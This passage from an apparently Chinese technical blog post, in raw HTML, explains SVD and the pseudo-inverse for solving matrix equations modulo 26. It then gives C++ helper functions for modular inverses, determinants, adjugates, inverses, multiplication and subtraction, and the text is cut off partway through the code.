class=\"mord mathnormal\">n</span></span></span></span> 的正交矩阵，列向量是 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>X</mi><msup><mi>X</mi><mi>T</mi></msup></mrow><annotation encoding=\"application/x-tex\">XX^T</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8413309999999999em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8413309999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span></span></span></span></span></span></span> 的特征向量</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi mathvariant=\"normal\">Σ</mi></mrow><annotation encoding=\"application/x-tex\">\\Sigma</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">Σ</span></span></span></span> 是一个 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi><mo>×</mo><mi>m</mi></mrow><annotation encoding=\"application/x-tex\">n \\times m</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.66666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">m</span></span></span></span> 的对角矩阵，包含 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>X</mi></mrow><annotation encoding=\"application/x-tex\">X</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span></span></span></span> 的奇异值</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>V</mi><mi>T</mi></msup></mrow><annotation encoding=\"application/x-tex\">V^T</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8413309999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8413309999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span></span></span></span></span></span></span> 是一个 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>m</mi><mo>×</mo><mi>m</mi></mrow><annotation encoding=\"application/x-tex\">m \\times m</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.66666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">m</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">m</span></span></span></span> 的正交矩阵，，列向量是 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>X</mi><mi>T</mi></msup><mi>X</mi></mrow><annotation encoding=\"application/x-tex\">X^TX</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8413309999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8413309999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span></span></span></span> 的特征向量</li>\n</ul>\n<p>伪逆 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>X</mi><mo>+</mo></msup></mrow><annotation encoding=\"application/x-tex\">X^+</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.771331em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.771331em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mbin mtight\">+</span></span></span></span></span></span></span></span></span></span></span> 可以通过 SVD 得到：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><msup><mi>X</mi><mo>+</mo></msup><mo>=</mo><mi>V</mi><msup><mi mathvariant=\"normal\">Σ</mi><mo>+</mo></msup><msup><mi>U</mi><mi>T</mi></msup></mrow><annotation encoding=\"application/x-tex\">X^+ = V \\Sigma^+ U^T\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.821331em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.821331em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mbin mtight\">+</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8913309999999999em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">V</span><span class=\"mord\"><span class=\"mord\">Σ</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.821331em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mbin mtight\">+</span></span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8913309999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span></span></span></span></span></span></span></span></p>\n<p>其中 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi mathvariant=\"normal\">Σ</mi><mo>+</mo></msup></mrow><annotation encoding=\"application/x-tex\">\\Sigma^+</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.771331em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\">Σ</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.771331em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mbin mtight\">+</span></span></span></span></span></span></span></span></span></span></span> 是将 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi mathvariant=\"normal\">Σ</mi></mrow><annotation encoding=\"application/x-tex\">\\Sigma</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">Σ</span></span></span></span> 中的非零奇异值取倒数并转置后得到的矩阵。在模 26 的意义下应当是取逆。</p>\n<div class=\"note primary\">\n<p>这里实际上有一个问题就是是否所有的奇异值都是可逆的</p>\n</div>\n<p>对于如下形式的矩阵方程，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>X</mi></mrow><annotation encoding=\"application/x-tex\">X</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span></span></span></span>，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>Y</mi></mrow><annotation encoding=\"application/x-tex\">Y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span></span></span></span> 不再是方阵：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>X</mi><mo>⋅</mo><mi>L</mi><mo>=</mo><mi>Y</mi></mrow><annotation encoding=\"application/x-tex\">X\\cdot L = Y\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">L</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span></span></span></span></span></p>\n<p>其解形式为：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>L</mi><mo>=</mo><msup><mi>X</mi><mo>+</mo></msup><mi>Y</mi></mrow><annotation encoding=\"application/x-tex\">L = X^+Y\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">L</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.821331em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.821331em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mbin mtight\">+</span></span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span></span></span></span></span></p>\n<p>当 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>X</mi></mrow><annotation encoding=\"application/x-tex\">X</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span></span></span></span> 的秩 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>r</mi></mrow><annotation encoding=\"application/x-tex\">r</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span></span></span></span> 小于 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>min</mi><mo>⁡</mo><mo stretchy=\"false\">(</mo><mi>m</mi><mo separator=\"true\">,</mo><mi>n</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">\\min(m, n)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mop\">min</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">m</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mclose\">)</span></span></span></span> 时，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>X</mi><mo>+</mo></msup></mrow><annotation encoding=\"application/x-tex\">X^+</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.771331em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.771331em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mbin mtight\">+</span></span></span></span></span></span></span></span></span></span></span> 仍然是有效的，但解可能不唯一。在我们的应用中，保证有解的条件下应该是唯一的。</p>\n<h1 id=\"代码实现\"><a class=\"anchor\" href=\"#代码实现\">#</a> 代码实现</h1>\n<h2 id=\"common\"><a class=\"anchor\" href=\"#common\">#</a> Common</h2>\n<h3 id=\"矩阵运算\"><a class=\"anchor\" href=\"#矩阵运算\">#</a> 矩阵运算</h3>\n<p>所有的运算均模 26 意义下，所以可以先定义：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">int</span> MOD = <span class=\"number\">26</span>;</span><br></pre></td></tr></table></figure></p>\n<p>为了方便和加快求逆，可以直接定义一个数组作为取逆表，使得下标作为输入就能得到结果，若结果为 0 就表示不可逆：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">int</span> inversetable[<span class=\"number\">26</span>] = &#123;</span><br><span class=\"line\">    <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">9</span>, <span class=\"number\">0</span>, <span class=\"number\">21</span>, <span class=\"number\">0</span>, <span class=\"number\">15</span>, <span class=\"number\">0</span>, <span class=\"number\">3</span>, <span class=\"number\">0</span>, <span class=\"number\">19</span>, <span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">7</span>, <span class=\"number\">0</span>, <span class=\"number\">23</span>, <span class=\"number\">0</span>, <span class=\"number\">11</span>, <span class=\"number\">0</span>, <span class=\"number\">5</span>, <span class=\"number\">0</span>, <span class=\"number\">17</span>, <span class=\"number\">0</span>, <span class=\"number\">25</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></p>\n<p>计算行列式：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">determinant</span><span class=\"params\">(<span class=\"type\">const</span> vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt;&amp; matrix)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> n = matrix.<span class=\"built_in\">size</span>();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (n == <span class=\"number\">1</span>) <span class=\"keyword\">return</span> matrix[<span class=\"number\">0</span>][<span class=\"number\">0</span>] % MOD;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">int</span> det = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> p = <span class=\"number\">0</span>; p &lt; n; p++) &#123;</span><br><span class=\"line\">        vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt; <span class=\"built_in\">submatrix</span>(n - <span class=\"number\">1</span>, <span class=\"built_in\">vector</span>&lt;<span class=\"type\">int</span>&gt;(n - <span class=\"number\">1</span>));</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">1</span>; i &lt; n; i++) &#123;</span><br><span class=\"line\">            <span class=\"type\">int</span> sub_j = <span class=\"number\">0</span>;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"type\">int</span> j = <span class=\"number\">0</span>; j &lt; n; j++) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (j == p) <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">                submatrix[i - <span class=\"number\">1</span>][sub_j++] = matrix[i][j];</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        det += (p % <span class=\"number\">2</span> == <span class=\"number\">0</span> ? <span class=\"number\">1</span> : <span class=\"number\">-1</span>) * matrix[<span class=\"number\">0</span>][p] * <span class=\"built_in\">determinant</span>(submatrix);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (det % MOD + MOD) % MOD; <span class=\"comment\">// 确保是正数</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>计算伴随矩阵：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt; <span class=\"built_in\">adjugate</span>(<span class=\"type\">const</span> vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt;&amp; matrix) &#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> n = matrix.<span class=\"built_in\">size</span>();</span><br><span class=\"line\">    vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt; <span class=\"built_in\">adj</span>(n, <span class=\"built_in\">vector</span>&lt;<span class=\"type\">int</span>&gt;(n));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">int</span> j = <span class=\"number\">0</span>; j &lt; n; j++) &#123;</span><br><span class=\"line\">            vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt; <span class=\"built_in\">submatrix</span>(n - <span class=\"number\">1</span>, <span class=\"built_in\">vector</span>&lt;<span class=\"type\">int</span>&gt;(n - <span class=\"number\">1</span>));</span><br><span class=\"line\">            <span class=\"type\">int</span> sub_i = <span class=\"number\">0</span>;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"type\">int</span> row = <span class=\"number\">0</span>; row &lt; n; row++) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (row == i) <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">                <span class=\"type\">int</span> sub_j = <span class=\"number\">0</span>;</span><br><span class=\"line\">                <span class=\"keyword\">for</span> (<span class=\"type\">int</span> col = <span class=\"number\">0</span>; col &lt; n; col++) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (col == j) <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">                    submatrix[sub_i][sub_j++] = matrix[row][col];</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                sub_i++;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            adj[j][i] = ((i + j) % <span class=\"number\">2</span> == <span class=\"number\">0</span> ? <span class=\"number\">1</span> : <span class=\"number\">-1</span>) * <span class=\"built_in\">determinant</span>(submatrix) % MOD;</span><br><span class=\"line\">            adj[j][i] = (adj[j][i] + MOD) % MOD; <span class=\"comment\">// 确保是正数</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> adj;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>以行列式的逆和原矩阵作为输入计算逆矩阵。这里将行列式的逆解耦出来是为了方便先判断方阵是否可逆，再计算逆：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt; <span class=\"built_in\">inverse</span>(<span class=\"type\">const</span> vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt;&amp; matrix, <span class=\"type\">int</span> det_inv) &#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> n = matrix.<span class=\"built_in\">size</span>();</span><br><span class=\"line\">    vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt; adj = <span class=\"built_in\">adjugate</span>(matrix);</span><br><span class=\"line\">    vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt; <span class=\"built_in\">inv</span>(n, <span class=\"built_in\">vector</span>&lt;<span class=\"type\">int</span>&gt;(n));</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">int</span> j = <span class=\"number\">0</span>; j &lt; n; j++) &#123;</span><br><span class=\"line\">            inv[i][j] = (adj[i][j] * det_inv) % MOD;</span><br><span class=\"line\">            inv[i][j] = (inv[i][j] + MOD) % MOD;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> inv;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>矩阵乘法：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt; <span class=\"built_in\">multiply</span>(<span class=\"type\">const</span> vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt;&amp; A, <span class=\"type\">const</span> vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt;&amp; B) &#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> rowsA = A.<span class=\"built_in\">size</span>();</span><br><span class=\"line\">    <span class=\"type\">int</span> colsA = A[<span class=\"number\">0</span>].<span class=\"built_in\">size</span>();</span><br><span class=\"line\">    <span class=\"type\">int</span> colsB = B[<span class=\"number\">0</span>].<span class=\"built_in\">size</span>();</span><br><span class=\"line\">    vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt; <span class=\"built_in\">C</span>(rowsA, <span class=\"built_in\">vector</span>&lt;<span class=\"type\">int</span>&gt;(colsB, <span class=\"number\">0</span>));</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; rowsA; i++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">int</span> j = <span class=\"number\">0</span>; j &lt; colsB; j++) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"type\">int</span> k = <span class=\"number\">0</span>; k &lt; colsA; k++) &#123;</span><br><span class=\"line\">                C[i][j] = (C[i][j] + A[i][k] * B[k][j]) % MOD;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> C;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>矩阵减法：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt; <span class=\"built_in\">sub</span>(<span class=\"type\">const</span> vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt;&amp; A, <span class=\"type\">const</span> vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt;&amp; B) &#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> rowsA = A.<span class=\"built_in\">size</span>();</span><br><span class=\"line\">    <span class=\"type\">int</span> colsB = B[<span class=\"number\">0</span>].<span class=\"built_in\">size</span>();</span><br><span class=\"line\">    vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt; <span class=\"built_in\">C</span>(rowsA, <span class=\"built_in\">vector</span>&lt;<span class=\"type\">int</span>&gt;(colsB, <span class=\"number\">0</span>));</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span 